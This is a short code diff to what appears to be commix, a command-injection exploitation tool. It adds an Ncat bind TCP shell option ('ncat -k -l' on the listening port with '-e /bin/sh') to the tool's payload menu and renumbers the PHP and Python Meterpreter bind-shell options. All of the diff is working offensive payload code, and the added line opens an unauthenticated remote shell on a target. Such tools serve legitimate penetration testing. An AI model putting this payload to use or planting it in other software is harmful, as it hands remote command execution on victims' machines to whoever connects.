@@ -255,9 +255,10 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl bind T
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby bind TCP shell. 
 Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python bind TCP shell.
 Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat bind TCP shell.
+Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Ncat bind TCP shell.
 \n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter bind TCP shells""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a PHP meterpreter bind TCP shell.
-Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Python meterpreter bind TCP shell. 
+Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a PHP meterpreter bind TCP shell.
+Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python meterpreter bind TCP shell. 
 \ncommix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + """) > """)
     
     # PHP-bind-shell
@@ -346,8 +347,13 @@ Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Python mete
                     " exec:\"sh\""
       break
 
-    # PHP-bind-shell(meterpreter)
+    # Ncat-bind-shell
     elif other_shell == '6':
+      other_shell = "ncat -k -l " + settings.LPORT + " -e /bin/sh"
+      break
+
+    # PHP-bind-shell(meterpreter)
+    elif other_shell == '7':
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
@@ -391,7 +397,7 @@ Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Python mete
       break
 
     # Python-bind-shell(meterpreter)
-    elif other_shell == '7':
+    elif other_shell == '8':
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
